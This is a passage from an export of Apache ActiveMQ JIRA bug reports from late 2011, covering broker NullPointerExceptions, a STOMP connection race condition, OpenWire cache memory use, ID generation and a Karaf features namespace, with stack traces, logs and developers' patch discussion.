at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:223)
at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:205)
at java.lang.Thread.run(Thread.java:680)
WARN | {color:red}Async error occurred: java.lang.NullPointerException
java.lang.NullPointerException{color}
at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:551)
at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:223)
at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:205)
at java.lang.Thread.run(Thread.java:680)

In this case the actual problem is the certificate doesn't match the configured password, but the two NPEs after this exception don't look good.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Dec/11 18:59;slewis;0001-Avoid-NPE.patch;https://issues.apache.org/jira/secure/attachment/12506497/0001-Avoid-NPE.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,219951,,,Wed Dec 28 19:17:58 UTC 2011,,,,,,,Patch Available,,,,"0|i0agrj:",58989,,,,,,,,,,,,,,,,,,,,,"20/Dec/11 14:02;tabish;The patch doesn't address the real issue here which is that the TransportConnection is continuing to process incoming commands from the its Transport after the detection of a Security violation from the Connection request.  It seems that the safer thing to do here would be to block processing of any additional incoming commands and terminate the connection after sending back a ConnectionError command to the connecting client.;;;","28/Dec/11 19:17;tabish;Tests all still passing on the CI box, marking as resolved now.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE in LastImageSubscriptionRecoveryPolicy,AMQ-3622,12534040,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,slewis,slewis,06/Dec/11 15:16,02/May/13 02:29,14/Jul/23 05:43,07/Dec/11 17:50,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Start up a subscriber when no messages are available and this NPE will eventually get logged:

2011-12-02 15:01:00,588 | WARN  | Failed to browse Topic: xxx | org.apache.activemq.broker.region.Topic | ActiveMQ Broker[xxx] Scheduler
java.lang.NullPointerException
	at org.apache.activemq.broker.region.policy.LastImageSubscriptionRecoveryPolicy.browse(LastImageSubscriptionRecoveryPolicy.java:63)
	at org.apache.activemq.broker.region.Topic.browse(Topic.java:564)
	at org.apache.activemq.broker.region.Topic$6.run(Topic.java:659)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Timer.java:512)
	at java.util.TimerThread.run(Timer.java:462)

repeatedly every 30 seconds or so until a message is sent to the topic.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3623,"06/Dec/11 15:42;slewis;0001-Avoid-NPE.patch;https://issues.apache.org/jira/secure/attachment/12506265/0001-Avoid-NPE.patch","06/Dec/11 20:28;slewis;0002-Add-test-for-AMQ-3622.patch;https://issues.apache.org/jira/secure/attachment/12506304/0002-Add-test-for-AMQ-3622.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,219766,,,Wed Dec 07 17:50:59 UTC 2011,,,,,,,Patch Available,,,,"0|i0aih3:",59266,,,,,,,,,,,,,,,,,,,,,"06/Dec/11 15:42;slewis;Here's the patch!;;;","06/Dec/11 20:28;slewis;Here's the test for this patch, needs patch applied for AMQ-3623 first;;;","07/Dec/11 17:50;gtully;patch and test applied with thanks.
http://svn.apache.org/viewvc?rev=1211568&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
when using openwire with cacheEnabled=false memory is wasted on unmarshallCache[] and marshallCache[],AMQ-3618,12533766,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,rajdavies,jacobs,jacobs,04/Dec/11 07:18,05/Dec/11 15:50,14/Jul/23 05:43,05/Dec/11 15:50,,,,,,5.6.0,,,,,,,0,,,,,,,,,"The OpenWireFormat has 2 array fields unmarshallCache[] and marshallCache[] which together consume 256K, in case of many TopicConsumers when using FilePendingMessageCursor this causes allot of memory to be used by the OpenWire caching arrays. even if you disable caching these arrays are still created.",,jacobs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Dec/11 07:19;jacobs;OpenWireFormat.patch;https://issues.apache.org/jira/secure/attachment/12506024/OpenWireFormat.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,219493,,,Mon Dec 05 15:50:55 UTC 2011,,,,,,,Patch Available,,,,"0|i0aihj:",59268,,,,,,,,,,,,,,,,,,,,,"05/Dec/11 15:50;rajdavies;changes applied in SVN version 1210506;;;","05/Dec/11 15:50;rajdavies;Thank you for contributing Jacob!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unable to generate unique id when range of ports are blocked - org.apache.activemq.util.IdGenerator,AMQ-3614,12533349,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,jsherman1,jsherman1,30/Nov/11 21:11,01/Dec/11 17:29,14/Jul/23 05:43,01/Dec/11 17:29,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"org.apache.activemq.util.IdGenerator is unable to generate a unique id if a range of ports have been block.
Currently there is only one strategy create this id if the canAccessSystemProps condition is true:

{code}
if (canAccessSystemProps) {
            try {
                hostName = InetAddressUtil.getLocalHostName();
                ServerSocket ss = new ServerSocket(0);
                stub = ""-"" + ss.getLocalPort() + ""-"" + System.currentTimeMillis() + ""-"";
                Thread.sleep(100);
                ss.close();
            } catch (Exception ioe) {
                LOG.warn(""could not generate unique stub"", ioe);
            }
        } else {
            hostName = ""localhost"";
            stub = ""-1-"" + System.currentTimeMillis() + ""-"";
        }
{code}

No fallback strategy has been implemented if the canAccessSystemProp evaluates to true",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Nov/11 21:14;jsherman1;AMQ3614.patch;https://issues.apache.org/jira/secure/attachment/12505666/AMQ3614.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,219077,,,Thu Dec 01 17:29:08 UTC 2011,,,,,,,,,,,"0|i0agrr:",58990,,,,,,,,,,,,,,,,,,,,,"30/Nov/11 21:14;jsherman1;Attaching patch with fallback strategy if unable to bind to port;;;","01/Dec/11 17:29;gtully;thanks. patch applied with with small mods. Left the log at warn as the fallback means that two clients could use the same ids.

http://svn.apache.org/viewvc?rev=1209162&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Features descriptor should define the namespace,AMQ-3606,12532484,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,jbonofre,jbonofre,23/Nov/11 16:01,27/Feb/14 15:18,14/Jul/23 05:43,02/Feb/12 11:19,5.5.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"The future Karaf 3.0 version will validate the features XML. The namespace is now require.

I'm gonna submit a patch to define it.

On the other hand, I think that the features-2.1.xml file is no more required. I will provide another patch to remove it.",,cemmersb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Nov/11 10:37;jbonofre;AMQ-3606.patch;https://issues.apache.org/jira/secure/attachment/12505003/AMQ-3606.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,218217,,,Thu Feb 27 15:18:16 UTC 2014,,,,,,,Patch Available,,,,"0|i0aiin:",59273,,,,,,,,,,,,,,,,,,,,,"25/Jan/12 21:17;tabish;Dejan, can you take a look at the supplied patch and see if its in order?;;;","02/Feb/12 11:19;dejanb;Patch applied with svn revision 1239540.

It already discovered one typo in the features file.

Thanks!;;;","27/Feb/14 15:18;cemmersb;Hi

it seems that this issue still exists with activemq-karaf version 5.9.0. See the following WARN message:

org.apache.karaf.features.core - 3.0.0 | Old style feature file without namespace found (URI: mvn:org.apache.activemq/activemq-karaf/5.9.0/xml/features). This format is deprecated and support for it will soon be removed

Could be removed, e.g. via:

{code}
<?xml version=""1.0"" encoding=""UTF-8""?>
<features name=""..."" xmlns=""http://karaf.apache.org/xmlns/features/v1.2.0"">
...
</features>
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException in TransportConnection,AMQ-3605,12532462,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,tomyl,tomyl,23/Nov/11 12:15,13/Dec/11 23:14,14/Jul/23 05:43,13/Dec/11 23:14,5.5.0,,,,,5.6.0,,,Transport,,,,0,stomp,,,,,,,,"I'm running ActiveMQ 5.5.0 and clients using Net::Stomp 0.38_99 and I'm seeing infrequent NullPointerExceptions in TransportConnection:

{noformat}
Exception in thread ""ActiveMQ Connection Dispatcher: /172.31.201.11:50607"" java.lang.NullPointerException
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:327)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
        at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:79)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:596)
        at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:58)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1270)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:815)
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:851)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)
{noformat}

This seems to happen 1-2 times per month or so but the result is dire: new messages aren't delivered to the affected client (you can see the number of pending messages increasing in the admin web interface) until the client or ActiveMQ is restarted.

Relevant code snippet from TransportConnection.java,

{noformat}
326         if (context != null) {
327             if (context.isDontSendReponse()) {
{noformat}

implies that we are dealing with a race condition. I'm not familiar with the ActiveMQ code base but it looks like it grabs a lock (serviceLock) before entering that function, so not sure what's going on.

Since there's no timestamp associated with the stack trace I'm not completly sure what's going on on the client side. I've tried to reproduce it by writing a small script that uses Net::Stomp in a similar way to my real clients, but no luck so far.

No idea if it's relevant, but my affected clients have been both consuming and producing, and sending/receiving on both topics and queues.","SLES 11 SP1
java version ""1.6.0_23""
perl 5.10.0 + Net::Stomp 0.38_99",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Nov/11 13:05;tabish;AMQ-3605-Patch.txt;https://issues.apache.org/jira/secure/attachment/12505618/AMQ-3605-Patch.txt","30/Nov/11 13:07;tabish;StompDedicatedTaskRunnerTests.java;https://issues.apache.org/jira/secure/attachment/12505619/StompDedicatedTaskRunnerTests.java","23/Nov/11 16:18;tabish;StompDedicatedTaskRunnerTests.java;https://issues.apache.org/jira/secure/attachment/12504890/StompDedicatedTaskRunnerTests.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,218195,,,Tue Dec 13 23:14:12 UTC 2011,,,,,,,,,,,"0|i0aiiv:",59274,,,,,,,,,,,,,,,,,,,,,"23/Nov/11 12:23;tomyl;I haven't tried the trunk version yet, but I don't see any relevant changes in svn so figured I should ask here first.;;;","23/Nov/11 13:04;gtully;please try trunk, if you reproduce it will provide a stack trace (line numbers) and context that matches trunk where it will be fixed.
The addition of an inactivity monitor for stomp 1.1 support has caused some tightening up of the synchronization between stomp and amq request paths, this may be relevant.

Also please attach the broker log files, it may be contention between connection tear down and dispatch. In addition, if you can reproduce, add trace level logging to TransportConnection to gather some extra information.  ;;;","23/Nov/11 13:46;tomyl;Thanks for quick reply.

I saved the stack trace above from the console output, I don't see it in my activemq.log. I do see some EOFExceptions for other clients in activemq.log around that time:

{noformat}
2011-11-21 17:26:58,051 | INFO  | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///172.31
.201.11:50680
2011-11-21 17:44:39,533 | INFO  | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///172.31
.201.11:46575
2011-11-21 18:30:38,362 | INFO  | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///172.31
.201.11:46577
{noformat}

I think the NullPointerException occured shortly after 17:44. As far as I can tell, EOFExceptions are normal for stomp clients in 5.5.0, and I don't see it for affected clients anyway.

I'll try a trunk snapshot.
;;;","23/Nov/11 16:18;tabish;I've started looking into this a bit and while I haven't been able to reproduce the NullPointerException I can cause a different exception that seems to be related.  The error seems to be coming from the auto ack of a message that's being dispatched as the connection is closed or broker on the client side.  This happens more often with a large prefetch such that the broker is busy dispatching messages when the disconnect comes in.

Attaching the test case I have so far as I will be out over thanksgiving.

{noformat}
2011-11-23 10:20:42,152 [127.0.0.1:57419] - WARN  Service                        - Async error occurred: java.lang.IllegalStateException: Cannot lookup a consumer from a connection that had not been registered: ID:OfficePC-40536-1322061638124-3:1
java.lang.IllegalStateException: Cannot lookup a consumer from a connection that had not been registered: ID:OfficePC-40536-1322061638124-3:1
	at org.apache.activemq.broker.SingleTransportConnectionStateRegister.lookupConnectionState(SingleTransportConnectionStateRegister.java:83)
	at org.apache.activemq.broker.TransportConnection.lookupConnectionState(TransportConnection.java:1434)
	at org.apache.activemq.broker.TransportConnection.getConsumerBrokerExchange(TransportConnection.java:1348)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:476)
	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:229)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:229)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:87)
	at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:78)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:746)
	at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:64)
	at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:262)
	at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:244)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1281)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:830)
	at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:866)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
{noformat}
;;;","23/Nov/11 18:29;tabish;For the error I was able to reproduce the problem comes from a race between the processDispatch in TransportConnection's iterate method and the processRemoveConnection method where is does:

{noformat}
 TransportConnectionState state = unregisterConnectionState(id);
{noformat}

Since the connection is removed right before the processDispatch males the loop from the Stomp transport's auto ack of the dispatched message we end up with the above error.  The NPE that the reporter has seen is probably related to something similar.  
;;;","30/Nov/11 13:05;tabish;Patch the seems to resolve the issue,;;;","30/Nov/11 13:07;tabish;Updated test case, not really meant for inclusion as it doesn't actually assert anything to show the exceptions but at least allows them to be seen.  Can fail as the disconnect response isn't always read fast enough due to all the prefetched messages.;;;","30/Nov/11 13:08;tabish;Added a tentative patch to the TransportConnection class.  Seems to resolve the issue but I was seeing some failures in some unit tests locally and haven't fully resolved if they are related to this change or just the normal flaky tests we see fail sometimes.  Most failures seem to be in the Network bridge areas.;;;","12/Dec/11 12:50;tomyl;I've done some testing against 5.6-SNAPSHOT (as of 2011-11-23). I don't see the NPE anymore but clients closing the socket in an unclean fashion seems to still be a problem. 

It looks like my affected client now hangs on the SEND call. I can reproduce this problem within minutes by stressing my clients while a script repeatedly forks, connects to AMQ, subscribes to a topic and then calls _exit() (to make sure the socket isn't closed by the garbage collector).

The resulting AMQ log is 200MB+ and may contain sensitive information, so I can't attach it as it is. Just before the client hangs I see (log excerpts slightly edited, message bodies and headers are removed):

{noformat}
2011-12-12 10:56:21,776 | TRACE | Received: 
SEND
[...]

2011-12-12 10:56:21,776 | DEBUG | message is ActiveMQTextMessage {commandId = 2262, responseRequired = false, messageId = ID:dev01-54928-1323379526715-4:15980:-1:1:
2254, originalDestination = null, originalTransactionId = null, producerId = ID:dev01-54928-1323379526715-4:15980:-1:1, destination = topic://change.TRANSFER, trans
actionId = null, expiration = 0, timestamp = 1323683781775, arrival = 0, brokerInTime = 1323683781775, brokerOutTime = 1323683781775, correlationId = null, replyTo = n
ull, persistent = false, type = EVENT.ResourceChangeEvent, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null,
 content = null, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 1507, properties = {[...]}, readOnlyProperties = true, readO
nlyBody = true, droppable = false, text = <?xml version=""1.0"" encoding=""UTF-8""?>
<atom:...atom:entry>
}
2011-12-12 10:56:21,776 | DEBUG | Message available, but continuation is already resumed.  Buffer for next time.
2011-12-12 10:56:21,776 | DEBUG | Transport failed: java.io.EOFException
java.io.EOFException
        at java.io.DataInputStream.readByte(DataInputStream.java:250)
        at org.apache.activemq.transport.stomp.StompWireFormat.readHeaderLine(StompWireFormat.java:155)
        at org.apache.activemq.transport.stomp.StompWireFormat.readLine(StompWireFormat.java:148)
        at org.apache.activemq.transport.stomp.StompWireFormat.parseAction(StompWireFormat.java:170)
        at org.apache.activemq.transport.stomp.StompWireFormat.unmarshal(StompWireFormat.java:98)
        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:229)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)
        at java.lang.Thread.run(Thread.java:662)
2011-12-12 10:56:21,776 | DEBUG | message for ActiveMQMessageConsumer { value=ID:dev01-54928-1323379526715-8:58:1:1, started=true } continuation=org.eclipse.jetty.s
erver.AsyncContinuation@e9b412d@IDLE,initial
2011-12-12 10:56:21,776 | DEBUG | message for ActiveMQMessageConsumer { value=ID:dev01-54928-1323379526715-8:57:1:1, started=true } continuation=org.eclipse.jetty.s
erver.AsyncContinuation@50afeae@IDLE,initial
2011-12-12 10:56:21,776 | TRACE | org.apache.activemq.broker.region.cursors.QueueStorePrefetch@73a2335d:daemon.archived,batchResetNeeded=false,storeHasMessages=true,si
ze=0,cacheEnabled=true - fillBatch
2011-12-12 10:56:21,777 | TRACE | ID:dev01-54928-1323379526715-8:58:1:1 received message: MessageDispatch {commandId = 391, responseRequired = false, consumerId = I
D:dev01-54928-1323379526715-8:58:1:1, destination = topic://change.TRANSFER, message = ActiveMQTextMessage {commandId = 2262, responseRequired = false, messageId = 
ID:dev01-54928-1323379526715-4:15980:-1:1:2254, originalDestination = null, originalTransactionId = null, producerId = ID:dev01-54928-1323379526715-4:15980:-1:1,
 destination = topic://change.TRANSFER, transactionId = null, expiration = 0, timestamp = 1323683781775, arrival = 0, brokerInTime = 1323683781775, brokerOutTime = 132
3683781775, correlationId = null, replyTo = null, persistent = false, type = EVENT.ResourceChangeEvent, priority = 4, groupID = null, groupSequence = 0, targetConsumer
Id = null, compressed = false, userID = null, content = null, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 1507, properties = {[...]},
readOnlyProperties = true, readOnlyBody = true, droppable = false, text = <?xml version=""1.0"" encoding=""UTF-8""?>
<atom:...atom:entry>
}, redeliveryCounter = 0}
2011-12-12 10:56:21,776 | DEBUG | Transport failed: java.net.SocketException: Broken pipe
java.net.SocketException: Broken pipe
        at java.net.SocketOutputStream.socketWrite0(Native Method)
        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)
        at java.io.DataOutputStream.flush(DataOutputStream.java:106)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:184)
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToStomp(StompTransportFilter.java:97)
        at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:99)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:746)
        at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:64)
        at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:262)
        at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:244)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1281)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:830)
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:866)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
{noformat}

The ""Received: SEND"" message is from my affected client. I see a bunch of such messages after the SocketException before the client hangs two seconds later. I assume the client hangs because some buffer at some level is full. I can't see anything obvious explaining why AMQ stops processing the client's messages.

Occasionally I also see the following exception:

{noformat}
java.lang.IllegalStateException: Cannot lookup a producer from a connection that had not been registered: ID:dev01-54928-1323379526715-4:59
        at org.apache.activemq.broker.SingleTransportConnectionStateRegister.lookupConnectionState(SingleTransportConnectionStateRegister.java:93)
        at org.apache.activemq.broker.TransportConnection.lookupConnectionState(TransportConnection.java:1438)
        at org.apache.activemq.broker.TransportConnection.getProducerBrokerExchange(TransportConnection.java:1314)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)
        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:229)
        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:87)
        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:166)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:292)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:204)
        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:76)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)
{noformat}

This exception is triggered more often when I do the stress test but sometimes it doesn't appear to have been thrown at all when the client has hanged.

Not sure how useful these log excerpts are. I haven't tested the attached patch yet. If you think it will help I can try to build AMQ myself.

;;;","12/Dec/11 17:24;tomyl;I went ahead and tested the patch. It didn't apply cleanly, but the rejected hunks were only change of for-loop constructs, so I ignored those.

The patch didn't solve the issue. Perhaps not related but at 17:54:01 I see a SocketException, and at 17:54:05 there's an InactivityIOException (my client hanged at 17:54:13):

{noformat}
2011-12-12 17:54:05,045 | TRACE | Received:
SEND
[...]

2011-12-12 17:54:05,043 | DEBUG | Transport failed: org.apache.activemq.transport.InactivityIOException: Cannot send, channel has already failed: tcp://172.31.201.1:45
974
org.apache.activemq.transport.InactivityIOException: Cannot send, channel has already failed: tcp://172.31.201.1:45974
        at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:255)
        at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:244)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1268)
        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:804)
        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:839)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
{noformat}

The SEND message is from the affected client.

Are there any particular messages I should look for? Or do you have any suggestions on where to put extra LOG.debug calls?
;;;","12/Dec/11 18:47;tabish;Depends somewhat on what branch of code you applied this to.  It should be applied to trunk and not a 5.5.x branch.  Testing here shows no issues of this sort so far.

;;;","12/Dec/11 18:52;tomyl;The patch was applied to trunk (checkout from today, r1213236).;;;","12/Dec/11 19:43;tabish;From the little bit of info provided I don't see an issue here as it looks as though the client was disconnected due to inactivity.  The debug log seems fine as it indicates that the send to the client fails because it was dropped.  You didn't get any NullPointerExceptions correct?;;;","12/Dec/11 20:35;tomyl;No NullPointerExceptions with 4.6-SNAPSHOT/trunk, that is correct.

